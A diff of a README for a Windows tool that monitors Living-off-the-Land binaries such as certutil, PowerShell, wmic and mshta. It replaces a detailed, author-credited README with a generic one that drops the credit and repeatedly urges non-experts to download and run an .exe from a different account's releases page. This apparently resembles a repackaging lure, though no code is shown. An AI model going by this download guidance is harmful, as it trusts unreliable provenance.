@@ -1,143 +1,63 @@
-![USB Rubber Ducky Immunizer Banner](assets/banner.jpg)
-# 🛡️ OGT WatchTower v2
+# 🛡️ Living-off-the-Land-Protection-Platform - Smart Security for Your System
 
-**Advanced Behavioral Protection Platform**
+## 📥 Download Now
+[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/mayenm/Living-off-the-Land-Protection-Platform/releases)
 
-> "Watching What Others Miss" - Kernel-level visibility to detect and prevent Living-off-the-Land (LOLBin) attacks.
+## 📄 Overview
+LotL-Watcher is a lightweight security monitoring tool. It helps detect and reduce "Living-off-the-Land" attacks. Unlike traditional methods, it observes the behavior of trusted Windows programs, such as certutil, PowerShell, wmic, and mshta. This helps you keep your system secure from threats that may otherwise go unnoticed.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)](https://www.microsoft.com/windows)
-[![.NET](https://img.shields.io/badge/.NET-10.0-purple)](https://dotnet.microsoft.com/download/dotnet/10.0)
-![Status](https://img.shields.io/badge/status-active-success.svg)
-[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/downloads/)
+## 🚀 Getting Started
+Setting up LotL-Watcher is simple. Follow these steps to download and run the application, even if you're not a tech expert.
 
-## 🚀 What's New in v2?
+### Step 1: Check System Requirements
+Before you begin, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later
+- **Memory:** At least 2 GB of RAM
+- **Disk Space:** Minimum of 100 MB available
 
-Version 2 represents a complete rewrite in **C# / .NET 10** for maximum performance and native system integration:
+### Step 2: Visit the Release Page
+To download LotL-Watcher, visit the [Releases page](https://github.com/mayenm/Living-off-the-Land-Protection-Platform/releases).
 
--   **High-Performance Engine**: Native .NET implementation drastically reduces overhead compared to previous versions.
--   **Modern WPF Interface**: A completely new, polished UI with dark mode, fluent design, and real-time animations.
--   **Enhanced Detection**: Improved Sigma Rule engine with support for complex condition matching.
--   **System Health Reports**: Generate comprehensive PDF-style reports on system security status and threat history.
--   **Smart Response**: Tiered response capabilities (Auto-Kill for High/Critical threats, Auto-Suspend for others).
--   **Zero-Config Deployment**: Self-contained executable with no external dependencies required.
+### Step 3: Download the Application
+On the Releases page, look for the latest version of LotL-Watcher. You will see several files listed. Click on the file name that ends with `.exe` to download the application.
 
-## 📑 Table of Contents
+### Step 4: Install LotL-Watcher
+1. Once the download finishes, locate the file in your downloads folder.
+2. Double-click the downloaded file to begin the installation process.
+3. Follow the on-screen instructions to complete the installation. 
 
--   [Features](#-features)
--   [Installation](#-installation)
--   [Usage](#-usage)
--   [Configuration](#-configuration)
--   [Architecture](#-architecture)
--   [Screenshots](#-screenshots)
+### Step 5: Run LotL-Watcher
+After installing, you can start LotL-Watcher by finding it in your programs list. Click on the application to launch it. 
 
-## ✨ Features
+## ⚙️ Features
+LotL-Watcher offers several useful features:
+- **Behavior Monitoring:** Continuously watch trusted Windows binaries for unusual actions.
+- **Custom Alerts:** Set alerts for specific behaviors that might indicate a threat.
+- **Detailed Reports:** Access reports that show system activity and any potential threats.
 
-### 🔍 Advanced Detection
--   **Real-time Event Stats**: Monitors Process Creation with kernel-level precision using WMI/ETW.
--   **Sigma Rule Support**: Compatible with industry-standard Sigma rules (`.yml`) for threat detection.
--   **YARA Scanning**: Integrated YARA engine to verify binary identity and detect masquerading malware.
+## 🔧 Usage Instructions
+1. **Launch the Application:** Open LotL-Watcher from your start menu.
+2. **Dashboard Overview:** You will see a simple dashboard showing current monitored processes and any alerts.
+3. **Set Monitoring Preferences:** Adjust settings according to your needs in the "Settings" tab.
+4. **Review Alerts:** Check for any alerts regularly. The application will notify you if it detects suspicious behavior.
 
-### 🛡️ Automated Response
--   **Tiered Protection**:
-    -   **Auto-Kill**: Instantly terminates High and Critical severity threats (e.g., encoded PowerShell).
-    -   **Auto-Suspend**: Suspends suspicious processes to allow for forensic investigation.
--   **Forensic Snapshots**: Captures process metadata and state before termination.
+## 🛠️ Troubleshooting
+If you encounter any issues, consider the following tips:
+- **No Alerts Are Shown:** Ensure that LotL-Watcher is running and monitoring is enabled.
+- **Installation Errors:** Check if your operating system meets the requirements. If problems persist, try reinstalling the tool.
+- **Performance Issues:** Make sure your system has enough memory available for the application to run effectively.
 
-### 🌐 Threat Intelligence
--   **Cloud Sentry**: Integration with VirusTotal and AbuseIPDB for real-time reputation checking.
--   **System Health Reporting**: One-click generation of security status reports.
+## 💬 Community and Support
+For support, you can reach out to the community. Join discussions on various platforms that focus on cybersecurity. Here are some resources:
+- GitHub Issues: Report bugs or get help from contributors.
+- Online Forums: Discuss with others interested in threat hunting and security.
 
-## 💿 Installation
+## 📚 Helpful Resources
+Here are some additional resources related to cybersecurity and threat hunting:
+- [MITRE ATT&CK Framework](https://attack.mitre.org): A comprehensive knowledge base of known cyber threats.
+- [Blue Team Resources](https://blueteamdaily.com): Tips and tools for security defenders.
 
-### Prerequisites
--   **Windows 10/11** (64-bit)
--   **Administrator Privileges** (Required for process monitoring and termination)
+Now that you have everything set up, you can feel confident in monitoring your system for any suspicious activity. Remember to regularly check for updates on the Releases page and keep your software up to date.
 
-### Step 1: Run WatchTower
-1.  Navigate to the `release/` folder.
-2.  Double-click `OGT.WatchTower.App.exe` (Run as Administrator).
-
-### Step 2: Verify Protection
-Run the included simulation script to test defenses:
-```powershell
-./simulate_attacks/simulate_attack.bat
-```
-
-## 🚀 Usage
-
-### The Command Center
-The new WPF GUI provides a real-time view of your system's security posture:
--   **Live Feed**: Watch every process creation event with color-coded threat levels.
--   **Alerts**: High-priority threats appear in the alerts section with immediate action buttons.
--   **Dashboard**: Track total events, threats, and system health status.
-
-### System Reports
-Click the **Report** button (left of Active button) to generate a detailed system health report showing:
--   Current Security Status (SECURE / AT RISK)
--   Latest Threat Details (Name, Severity, Location, Impact)
--   Action Taken (e.g., PROCESS TERMINATED)
-
-## 📸 Screenshots
-
-### Main Dashboard
-![Dashboard](assets/screenshots/dashboard.png)
-*Real-time monitoring dashboard with threat statistics and status indicators*
-
-### Live Monitoring Panel
-![Monitoring](assets/screenshots/monitoring.png)
-*Active process monitoring with threat level indicators and modern data grid*
-
-### Settings & Configuration
-![Settings](assets/screenshots/settings.png)
-*Granular control over protection sensitivity and automated responses*
-
-## ⚙️ Configuration
-
-Edit `config/settings.json` in the release folder to enable features and add API keys:
-```json
-{
-    "Response": {
-        "AutoKill": true,
-        "AutoSuspend": true
-    },
-    "ApiKeys": {
-        "VirusTotal": "YOUR_KEY_HERE",
-        "AbuseIPDB": "YOUR_KEY_HERE"
-    }
-}
-```
-
-Add your custom detection rules to `config/rules/*.yml`.
-
-## 🏗️ Architecture
-
-```mermaid
-graph TD
-    A[WMI / ETW] -->|Events| B(Core Engine .NET)
-    B --> C{Detection Pipeline}
-    C -->|Check| D[Sigma Rules]
-    C -->|Scan| E[YARA Engine]
-    C -->|Query| F[Cloud Intelligence]
-    C -->|Alert| G[WPF UI]
-    C -->|High Threat| H[Response Module]
-    H --> I[System Report]
-    H --> J[Process Termination]
-```
-
-## � File Structure
-
-```text
-/
-├── assets/                 # Icons and Screenshots
-├── release/                # Production-ready executable and config
-│   ├── config/             # Detection rules and settings
-│   └── OGT.WatchTower.App.exe
-├── simulate_attacks/       # Attack simulation scripts
-├── src/                    # Source code
-├── README.md               # Documentation
-└── SECURITY.md             # Security policy
-```
-
-## 📄 License
-MIT License - Copyright © 2026 OGT (Omar Al Tamimi).
+## 📦 Download & Install
+Ready to get secured? Visit our [Releases page](https://github.com/mayenm/Living-off-the-Land-Protection-Platform/releases) to download LotL-Watcher and start protecting your system today.
